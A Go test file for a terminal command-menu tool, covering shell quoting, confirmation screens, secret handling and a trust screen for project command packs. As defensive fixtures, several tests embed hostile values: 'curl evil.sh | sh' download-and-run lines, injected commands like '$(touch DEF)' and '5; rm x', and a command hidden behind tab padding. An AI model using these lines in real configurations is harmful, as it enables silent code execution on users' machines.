package ui

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"
	"github.com/con-dog/clingon/internal/config"
	"github.com/con-dog/clingon/internal/tmpl"
)

func TestScoreRanksSubstringAboveSubsequence(t *testing.T) {
	if score("del", "delete files") <= score("del", "docker exec login") {
		t.Fatal("substring should beat subsequence")
	}
	if score("xyz", "delete") != 0 {
		t.Fatal("non-match should score 0")
	}
	if score("go fold", "go to folder") == 0 {
		t.Fatal("words in order should match")
	}
}

func TestBurstIsTextNotAKeyName(t *testing.T) {
	burst := typed("delete")
	if keyName(burst) != "" {
		t.Fatal("a burst of typed text must not match the Delete key")
	}
	if keyName(tea.KeyPressMsg{Code: tea.KeyEnter}) != "enter" {
		t.Fatal("real keys keep their names")
	}
}

func TestDescribeExtendsPerArg(t *testing.T) {
	c := &config.Command{Desc: "Deletes files.", Risk: config.RiskWarn, Args: []config.Arg{
		{Name: "pattern", Desc: "Files named <pattern>."},
		{Name: "dir", Desc: "Under <dir>."},
		{Name: "flags", Type: "flags"},
	}}
	got := describe(c, map[string]string{"pattern": "*.log"}, map[string]string{}, 1, ".", "")
	if got != "Deletes files. Files named *.log. Under this folder. ⚠ Asks before running." {
		t.Fatalf("got %q", got)
	}
	got = describe(c, map[string]string{"pattern": "x", "dir": "src", "flags": "-i -w"}, map[string]string{"flags": "ignore case, whole words"}, 3, "", "")
	if got != "Deletes files. Files named x. Under src. Ignore case, whole words. ⚠ Asks before running." {
		t.Fatalf("got %q", got)
	}
}

func TestHighlightTokens(t *testing.T) {
	// Compare the plain text, and check which words got which style.
	cmd := `sudo apt update && du -h -d 1 . 2>/dev/null | sort -rh; grep -rn -- 'a b' "c"`
	if got := ansi.Strip(highlight(cmd)); got != cmd {
		t.Fatalf("highlighting changed the text: %q", got)
	}
	h := highlight(cmd)
	for _, want := range []string{
		hlProgram.Render("sudo"), hlProgram.Render("apt"), hlProgram.Render("du"), hlProgram.Render("sort"), hlProgram.Render("grep"),
		hlFlag.Render("-rh"), hlFlag.Render("--"), hlOperator.Render("&&"), hlOperator.Render("|"), hlOperator.Render(">"),
		hlString.Render("'a b'"),
	} {
		if !strings.Contains(h, want) {
			t.Errorf("missing %q", want)
		}
	}
	if strings.Contains(h, hlProgram.Render("update")) || strings.Contains(h, hlProgram.Render("/dev/null")) {
		t.Error("arguments styled as programs")
	}
}

func TestShellQuote(t *testing.T) {
	for in, want := range map[string]string{"mine": "mine", "My tools": "'My tools'", "find . -name '*.go'": `'find . -name '\''*.go'\'''`, "a/b.c:1": "a/b.c:1"} {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

func TestRiskyCommandScreen(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Delete", Cmd: "rm <file>", Risk: config.RiskWarn, Args: []config.Arg{{Name: "file"}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	key := func(k tea.KeyPressMsg) { m.Update(k) }
	enter, down := tea.KeyPressMsg{Code: tea.KeyEnter}, tea.KeyPressMsg{Code: tea.KeyDown}
	m.showSection(&m.opt.Config.Sections[0])

	key(enter) // open the command
	key(typed("a.txt"))
	key(enter) // last arg: on to the risky screen
	if m.mode != modeConfirm || m.yes {
		t.Fatalf("want the risky screen with No highlighted, mode %v yes %v", m.mode, m.yes)
	}
	key(enter) // Enter on "No, go back"
	if m.mode != modeFill || m.job.input.Value() != "a.txt" || len(sent) != 0 {
		t.Fatalf("No should go back to the answer, kept: mode %v value %q sent %v", m.mode, m.job.input.Value(), sent)
	}
	key(enter)
	key(down)  // highlight "Yes, run it"
	key(enter) // run
	if len(sent) != 1 || sent[0] != "rm a.txt" {
		t.Fatalf("got %v", sent)
	}
}

func TestValuesAreQuotedWhereTheArgSays(t *testing.T) {
	c := &config.Command{Cmd: "cd <dir> && git switch <b> && echo <raw>", Args: []config.Arg{
		{Name: "dir", Quote: true}, {Name: "b", Quote: true}, {Name: "raw"},
	}}
	got := tmpl.Render(c.Cmd, c.Known, shellValues(c, map[string]string{"dir": "My Docs", "b": "~", "raw": "a b"}))
	if got != "cd 'My Docs' && git switch ~ && echo a b" { // a typed ~ is your home
		t.Fatalf("got %s", got)
	}
	// A value typed into a fixed list instead of picked is quoted.
	c = &config.Command{Cmd: "head -n <n>", Args: []config.Arg{{Name: "n", Options: []config.Option{{Value: "10"}}}}}
	if got := tmpl.Render(c.Cmd, c.Known, shellValues(c, map[string]string{"n": "5; rm x"})); got != "head -n '5; rm x'" {
		t.Fatalf("got %s", got)
	}
}

func TestAnOptionalValueCanBeSkipped(t *testing.T) {
	sec := config.Section{Name: "Docker", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Up", Cmd: "docker compose up -d <services>", Args: []config.Arg{{Name: "services", Optional: true}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "docker compose up -d" {
		t.Fatalf("got %v", sent)
	}
}

func TestDisabledCommandsDontOpen(t *testing.T) {
	sec := &config.Section{Name: "Packs", Icon: "❏", Category: "Clingon", Commands: []config.Command{
		{Name: "Edit a pack", Cmd: "x <p>", Disabled: "You don't have any local packs yet.", Args: []config.Arg{{Name: "p"}}},
	}}
	m := New(Options{Config: &config.Config{}, Builtin: func() []*config.Section { return []*config.Section{sec} },
		Send: func(string) error { t.Fatal("nothing should run"); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(sec)
	if it := m.list.selected(); it == nil || !it.disabled {
		t.Fatal("the cursor lands on a greyed-out command, so it can say why")
	}
	if _, desc := m.details(); !strings.Contains(desc, "Not available: You don't have any local packs yet.") {
		t.Fatalf("the info pane says why, got %q", desc)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeBrowse || m.job != nil {
		t.Fatal("a greyed-out command must not open")
	}
}

func TestCursorStartsOnAUsableRow(t *testing.T) {
	sec := &config.Section{Name: "S", Icon: "•", Category: config.Other, Groups: []config.Group{
		{Name: "A", Commands: []config.Command{{Name: "a1", Cmd: "x", Disabled: "no"}, {Name: "a2", Cmd: "x"}, {Name: "a3", Cmd: "x", Disabled: "no"}}},
		{Name: "B", Commands: []config.Command{{Name: "b1", Cmd: "x", Disabled: "no"}, {Name: "b2", Cmd: "x"}}},
	}}
	m := New(Options{Config: &config.Config{}, Builtin: func() []*config.Section { return []*config.Section{sec} }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(sec)
	at := func() string { return m.list.selected().title }
	if at() != "a2" {
		t.Fatalf("starts on the first usable row, got %q", at())
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if at() != "a3" {
		t.Fatalf("down lands on greyed rows too, so they can say why, got %q", at())
	}
}

func TestShiftJumpsBetweenHeadings(t *testing.T) {
	items := []item{{title: "A", header: true}, {title: "a1"}, {title: "a2"}, {header: true}, {title: "B", header: true}, {title: "b1"}, {title: "b2"}}
	p := newPicker(items, nil, false)
	at := func() string { return p.selected().title }
	p.jump(1)
	if at() != "b1" {
		t.Fatalf("down from a1: %s", at())
	}
	p.jump(1)
	if at() != "b1" {
		t.Fatalf("down from the last heading stays: %s", at())
	}
	p.move(1) // b2
	p.jump(-1)
	if at() != "b1" {
		t.Fatalf("up goes to the top of the current heading first: %s", at())
	}
	p.jump(-1)
	if at() != "a1" {
		t.Fatalf("then to the previous heading: %s", at())
	}
	flat := newPicker([]item{{title: "x"}, {title: "y"}, {title: "z"}}, nil, false)
	flat.jump(1)
	if flat.selected().title != "z" {
		t.Fatal("no headings: jump to the bottom")
	}
}

func TestMenuLocksWhileShellIsBusy(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Edit a pack", Cmd: "micro x"}, {Name: "Other", Cmd: "ls"},
	}}
	var sent []string
	release := make(chan bool)
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send:     func(c string) error { sent = append(sent, c); return nil },
		WaitIdle: func() bool { return <-release }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	_, cmds := m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // runs "micro x"
	wait := cmds().(tea.BatchMsg)[0]
	if m.busy != "Edit a pack" {
		t.Fatalf("menu should lock while it runs, busy=%q", m.busy)
	}
	if bar := ansi.Strip(m.statusBar(60)); strings.Contains(bar, "is running") {
		t.Errorf("a command that's just started shouldn't flash the band, got %q", bar)
	}
	m.Update(busyGraceMsg{})
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown}) // browsing still works, as usual
	if it := m.list.selected(); it == nil || it.title != "Other" || it.disabled {
		t.Fatalf("rows stay as they are while it runs: only running waits, got %+v", it)
	}
	if cmd, _ := m.details(); !strings.Contains(ansi.Strip(cmd), "ls") {
		t.Errorf("the Command area still shows what it would run, got %q", cmd)
	}
	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "⏳ Edit a pack is running") {
		t.Errorf("the status bar should say so, got %q", bar)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape}) // back to the top
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape}) // and quitting would end micro: refused
	if len(sent) != 1 || m.Quit {
		t.Fatalf("nothing runs, and no quitting, while locked: sent %v quit %v", sent, m.Quit)
	}
	go func() { release <- true }()
	m.Update(wait()) // micro exits
	if m.busy != "" {
		t.Fatal("menu should unlock when the shell is back at its prompt")
	}
	m.showSection(&m.opt.Config.Sections[0]) // the Escs above went back to the top
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 2 || sent[1] != "ls" {
		t.Fatalf("unlocked: commands run again, got %v", sent)
	}
}

func TestTypedShellAsksFirst(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "List", Cmd: "ls"}}}
	var sent []string
	shell := ShellState{Typed: "git sta"}
	cleared, focused := 0, 0
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send:       func(c string) error { sent = append(sent, c); return nil },
		Shell:      func() ShellState { return shell },
		ClearShell: func() error { cleared++; shell = ShellState{}; return nil },
		FocusShell: func() { focused++ }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.Update(tea.FocusMsg{})
	m.showSection(&m.opt.Config.Sections[0])
	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "Typed in the shell: git sta") {
		t.Errorf("the status bar should say what's typed, got %q", bar)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeTyped || m.yes || len(sent) != 0 {
		t.Fatalf("want the question, with No first: mode %v sent %v", m.mode, sent)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // No, take me to the shell
	if focused != 1 || len(sent) != 0 || m.mode != modeBrowse {
		t.Fatalf("No goes to the shell and sends nothing: focused %d sent %v", focused, sent)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(typed("y")) // Yes, clear it and run
	if cleared != 1 || len(sent) != 1 || sent[0] != "ls" {
		t.Fatalf("Yes clears the prompt, then sends: cleared %d sent %v", cleared, sent)
	}
}

func TestScrolledBackShellHoldsCommands(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "List", Cmd: "ls"}}}
	shell := ShellState{Scrolling: true}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }, Shell: func() ShellState { return shell }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.FocusMsg{})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 0 || m.list.selected().disabled {
		t.Fatal("nothing can be sent into a scrolled-back shell, though the row isn't greyed")
	}
	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "scrolled back") {
		t.Errorf("the status bar should say why, got %q", bar)
	}
	shell = ShellState{}
	m.Update(tea.FocusMsg{}) // back after pressing q there
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 {
		t.Fatalf("once it's back at the prompt, commands run: %v", sent)
	}
}

func TestBracketsJumpInEveryTerminal(t *testing.T) {
	p := newPicker([]item{{title: "A", header: true}, {title: "a1"}, {title: "B", header: true}, {title: "b1"}}, nil, false)
	p.update(typed("]"))
	if p.selected().title != "b1" || p.query() != "" {
		t.Fatalf("] should jump, not type: at %s, filter %q", p.selected().title, p.query())
	}
	p.update(typed("["))
	if p.selected().title != "a1" {
		t.Fatalf("[ should jump back: at %s", p.selected().title)
	}
}

func TestChecklistDefaultsStartTicked(t *testing.T) {
	join := " && "
	sec := config.Section{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Settings", Cmd: "<s>", Args: []config.Arg{{Name: "s", Type: "flags", Join: &join, Default: "a 1 && c 3",
			Options: []config.Option{{Value: "a 1"}, {Value: "b 2"}, {Value: "c 3"}}}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }, Dir: func() string { return t.TempDir() }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "a 1 && c 3" {
		t.Fatalf("want the defaults ticked, got %v", sent)
	}
}

func TestStatusBarSaysWhenAToolIsMissing(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	if err := os.MkdirAll(filepath.Join(home, "go", "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, "go", "bin", "clingon-test-gopls"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	cmd := []config.Command{{Name: "Run", Cmd: "true"}}
	cfg := &config.Config{Sections: []config.Section{
		{Name: "Gone", Icon: "•", Category: config.Other, Commands: cmd, Needs: []string{"clingon-test-nope"}},
		{Name: "Hidden", Icon: "•", Category: config.Other, Commands: cmd, Needs: []string{"clingon-test-gopls"}},
		{Name: "Shell", Icon: "•", Category: config.Other, Commands: cmd, Needs: []string{"sh"}},
	}}
	news := Headline{Kind: Attention, Text: "↻ 2 pack updates for git, docker"}
	m := New(Options{Config: cfg, Dir: func() string { return t.TempDir() }, Headline: func() Headline { return news }})
	m.Update(tea.WindowSizeMsg{Width: 200, Height: 40})
	bar := func() string {
		b := m.statusBar(200)
		if ansi.StringWidth(b) != 200 {
			t.Errorf("the bar should fill the width, got %d", ansi.StringWidth(b))
		}
		return strings.TrimSpace(ansi.Strip(b))
	}
	if bar() != news.Text { // the top level has news; missing tools are for sections
		t.Errorf("top menu: got %q, want %q", bar(), news.Text)
	}
	for i, want := range []string{"✗ Needs clingon-test-nope (not installed)", "✗ Needs clingon-test-gopls (not on PATH: it's in ~/go/bin)", "✓ Everything Shell needs is installed"} {
		m.showSection(&cfg.Sections[i])
		if bar() != want {
			t.Errorf("%s: got %q, want %q", cfg.Sections[i].Name, bar(), want)
		}
	}
	if !strings.HasSuffix(strings.TrimSpace(ansi.Strip(m.view())), "✓ Everything Shell needs is installed") {
		t.Error("the status bar should be the last line, under the key hints")
	}
}

func TestWhenGreysOutAwayFromItsFiles(t *testing.T) {
	repo, elsewhere := t.TempDir(), t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(repo, "src", "deep"), 0o755); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(repo, "src", "deep") // a folder above has .git
	sec := config.Section{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Status", Cmd: "git status", When: []string{".git"}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }, Dir: func() string { return dir }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	if m.list.selected().disabled {
		t.Fatal("a .git above the folder counts")
	}
	dir = elsewhere
	m.Update(tea.FocusMsg{}) // back from the shell, after a cd
	if !m.list.items[1].disabled {
		t.Fatal("away from .git it should be greyed out")
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 0 || m.mode != modeBrowse {
		t.Fatal("a greyed-out command doesn't run")
	}
	dir = filepath.Join(repo, "src", "deep")
	m.Update(tea.FocusMsg{}) // and back in the repo
	if it := m.list.selected(); it == nil || it.title != "Status" {
		t.Fatalf("usable again: the cursor goes back to it, got %+v", it)
	}
}

func TestDangerMeansTypingACode(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Drop", Cmd: "dropdb <db>", Risk: config.RiskDanger, Args: []config.Arg{{Name: "db"}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	typ := func(s string) { m.Update(typed(s)) }
	enter := tea.KeyPressMsg{Code: tea.KeyEnter}
	if !strings.Contains(m.list.render(60, 10), dangerGlyph) {
		t.Error("danger commands are marked ☠")
	}
	m.Update(enter)
	typ("prod")
	m.Update(enter)
	if m.mode != modeConfirm || m.pending.typed {
		t.Fatal("want the type-the-code screen")
	}
	code := m.pending.code
	if len(code) != 4 || !strings.Contains(m.View().Content, code) {
		t.Fatalf("want a 4-letter code on screen, got %q", code)
	}
	m.Update(enter) // nothing typed: refused
	typ("dropdb prod")
	m.Update(enter) // wrong: refused, with a new code
	if !m.wrong || m.pending.typed || len(sent) != 0 || m.word.Value() != "" {
		t.Fatal("a mismatch shouldn't get through, and clears the box")
	}
	for _, near := range []func(string) string{strings.ToUpper, func(c string) string { return " " + c }, func(c string) string { return c + " " }} {
		typ(near(m.pending.code)) // each miss brings a new code, so build from the current one
		m.Update(enter)           // exactly the code: case and spaces count
		if m.pending.typed {
			t.Fatal("only the exact code gets through")
		}
	}
	typ(m.pending.code)
	m.Update(enter)
	if !m.pending.typed || m.yes {
		t.Fatal("typed right: now No/Yes, with No first")
	}
	m.Update(typed("y"))
	if len(sent) != 1 || sent[0] != "dropdb prod" {
		t.Fatalf("got %v", sent)
	}
}

func TestPatternRefusesBadValues(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Kill", Cmd: "kill-port <port>", Args: []config.Arg{{Name: "port", Pattern: "[0-9]+", Placeholder: "3000"}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(typed("80a"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 0 || !strings.Contains(m.job.invalid, "For example: 3000") {
		t.Fatalf("80a isn't a port: sent %v, said %q", sent, m.job.invalid)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "kill-port 80" {
		t.Fatalf("got %v", sent)
	}
}

func TestSecretsNeverReachTheScreenOrHistory(t *testing.T) {
	dir := t.TempDir()
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Connect", Cmd: "psql <url>", Args: []config.Arg{{Name: "url", Type: "secret", Desc: "On <url>."}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, SecretDir: dir,
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(typed("postgres://me:hunter2@db"))
	if v := ansi.Strip(m.view()); strings.Contains(v, "hunter2") {
		t.Fatalf("the secret is on screen:\n%s", v)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || strings.Contains(sent[0], "hunter2") || !strings.Contains(sent[0], "$(cat ") {
		t.Fatalf("the shell should get a reference, not the secret: %v", sent)
	}
	out, err := exec.Command("sh", "-c", "printf %s "+strings.TrimPrefix(sent[0], "psql ")).Output()
	if err != nil || string(out) != "postgres://me:hunter2@db" {
		t.Fatalf("the reference should give the secret back once: %q %v", out, err)
	}
	if left, _ := filepath.Glob(filepath.Join(dir, "secret-*")); len(left) != 0 {
		t.Errorf("the file should be gone after it's read: %v", left)
	}
}

func TestProjectPacksAskFirst(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte("sections:\n  - name: Deploy\n    groups:\n      - name: Prod\n        commands:\n          - name: Ship it\n            cmd: ./ship.sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Status", Cmd: "git status"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	m.showRoot("")
	if it := m.list.selected(); it == nil || it.title != "Use this folder's commands?" {
		t.Fatalf("an untrusted project asks first, got %+v", it)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeTrust || !strings.Contains(ansi.Strip(m.view()), "./ship.sh") {
		t.Fatal("the trust screen should show what it would run")
	}
	m.Update(typed("y"))
	if it := m.list.selected(); it == nil || it.title != "Deploy" {
		t.Fatalf("trusted: its sections show, got %+v", it)
	}
	// Editing the file means asking again.
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte("sections:\n  - name: Deploy\n    groups:\n      - name: Prod\n        commands:\n          - name: Ship it\n            cmd: curl evil.sh | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	m.showRoot("")
	if m.list.selected().title != "Use this folder's commands?" || !m.project.Changed {
		t.Fatal("a changed file should be untrusted again")
	}
}

func TestTrustScreenShowsEveryCommandBeforeYes(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	long := "ls " + strings.Repeat("padding ", 30) + "; curl evil | sh"
	var b strings.Builder
	b.WriteString("sections:\n  - name: Deploy\n    commands:\n")
	for i := 0; i < 40; i++ {
		fmt.Fprintf(&b, "      - name: C%d\n        cmd: echo command-%d\n", i, i)
	}
	fmt.Fprintf(&b, "      - name: Long\n        cmd: %s\n", long)
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 24})
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	seen := ""
	view := ansi.Strip(m.view())
	if !strings.Contains(view, "more to read") {
		t.Fatalf("it should say there's more:\n%s", view)
	}
	m.Update(typed("y"))
	if m.mode != modeTrust {
		t.Fatal("yes shouldn't work before the end")
	}
	for i := 0; i < 300 && m.trustTop < m.trustMax; i++ {
		seen += ansi.Strip(m.view())
		m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	}
	seen += ansi.Strip(m.view())
	flat := strings.Join(strings.Fields(seen), " ")
	for i := 0; i < 40; i++ {
		if !strings.Contains(flat, fmt.Sprintf("command-%d", i)) {
			t.Errorf("command-%d was never shown", i)
		}
	}
	if !strings.Contains(flat, "curl evil | sh") {
		t.Errorf("the end of a long command should be shown:\n%s", seen)
	}
	if !strings.Contains(ansi.Strip(m.view()), "Yes, use them") {
		t.Errorf("the choices should stay on screen:\n%s", m.view())
	}
	m.Update(typed("y"))
	if m.mode == modeTrust {
		t.Fatal("at the end, yes works")
	}
}

func TestTrustScreenSpellsOutWhatWouldTakeNoRoom(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	tabs := strings.Repeat(`\\t`, 33)
	pack := "sections:\n  - name: S\n    commands:\n      - name: Run\n        cmd: \"npm test" + tabs + ";touch HIDDEN\"\n" +
		"      - name: Wide\n        cmd: \"ls \\u1160\\u1160;touch WIDE\"\n"
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte(pack), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	view := ansi.Strip(m.view())
	if strings.Contains(view, "\t") || strings.ContainsRune(view, 0x1160) {
		t.Errorf("nothing that takes no room should be drawn:\n%q", view)
	}
	flat := strings.Join(strings.Fields(view), "")
	for _, want := range []string{`\t\t`, "HIDDEN", `\u{1160}`, "WIDE"} {
		if !strings.Contains(flat, want) {
			t.Errorf("%s should be on screen:\n%s", want, view)
		}
	}
}

func TestTrustScreenShowsOptionsDefaultsAndJoins(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	pack := `sections:
  - name: S
    commands:
      - name: D
        cmd: echo <env>
        args:
          - name: env
            options:
              - { value: 'staging;touch OPT', label: staging }
      - name: H
        cmd: echo <who>
        args:
          - { name: who, default: '$(touch DEF)' }
      - name: J
        cmd: echo <x>
        args:
          - name: x
            type: flags
            join: ';touch JOIN;'
            options: [a, b]
`
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte(pack), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	view := ansi.Strip(m.view())
	for _, want := range []string{"touch OPT", "touch DEF", "touch JOIN"} {
		if !strings.Contains(view, want) {
			t.Errorf("%s should be on the trust screen:\n%s", want, view)
		}
	}
}

func TestQuestionMarkShowsTheKeys(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "A", Cmd: "a"}}}}}})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	m.showRoot("")
	m.Update(typed("?"))
	if !m.help || !strings.Contains(ansi.Strip(m.view()), "shift-tab") {
		t.Fatal("? should show the keys")
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if m.help || m.list.query() != "" {
		t.Fatal("any key closes it, and does nothing else")
	}
}

func TestAnEmptiedDefaultStaysEmpty(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Log", Cmd: "log <n> <x>", Args: []config.Arg{{Name: "n", Default: "20", Optional: true}, {Name: "x"}}},
	}}
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // n cleared on purpose
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})  // back to it
	if v := m.job.input.Value(); v != "" {
		t.Fatalf("the default shouldn't come back after being cleared, got %q", v)
	}
}

func TestTextHelpersHandleWideAndAccentedText(t *testing.T) {
	if got := sentence("école fermée"); got != "École fermée." {
		t.Errorf("sentence = %q", got)
	}
	if got := ansi.Strip(block("zzzzzzzzz 日本 ab cd", 10, 1, true)); strings.Contains(got, "…b") {
